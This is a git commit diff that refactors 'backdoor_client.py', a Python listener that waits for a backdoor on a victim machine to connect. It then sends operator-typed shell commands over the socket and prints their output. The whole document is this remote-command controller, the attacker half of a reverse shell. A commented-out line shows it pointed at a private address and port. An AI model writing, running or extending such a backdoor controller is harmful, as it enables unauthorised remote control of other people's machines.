32654f33ddf408758df9ae22bc9fd4bdf9839341
Radeonares32 <bugra.linux.js@gmail.com>
2022-12-14 19:02:39 +0300

    -class modif

--- backdoor_client.py
+++ backdoor_client.py
@@ -1,21 +1,27 @@
 import socket
 import time
 
-backdoor_listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
-backdoor_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+class SocketClient:
+    def __init__(self, ip, port):
+        backdoor_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        backdoor_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        backdoor_listener.bind((ip, port))
+        backdoor_listener.listen(1)
+        print("Listening...")
+        (self.connection, address) = backdoor_listener.accept()
+        print("Connection OK" + str(address))
 
-backdoor_listener.bind(("0.0.0.0",8080))
+    def command_execution(self, command):
+        self.connection.sendall((command).encode())
+        return self.connection.recv(1024)
 
-backdoor_listener.listen(1)
+    def start_listener(self):
+        while True:
+            command = input("Enter command ")
+            command_output = self.command_execution(command)
+            print(command_output)
 
-print("Listening...")
 
-(connection,address) = backdoor_listener.accept()
-print("Connection OK" + str(address))
-
-while True:
-	command = input("Enter command ")
-	connection.sendall((command).encode())
-	command_output = connection.recv(1024)
-	print(command_output)
+#my_socket_listener = SockerClient("10.2.2.4",7070)
+#my_socket_listener.start_listener()
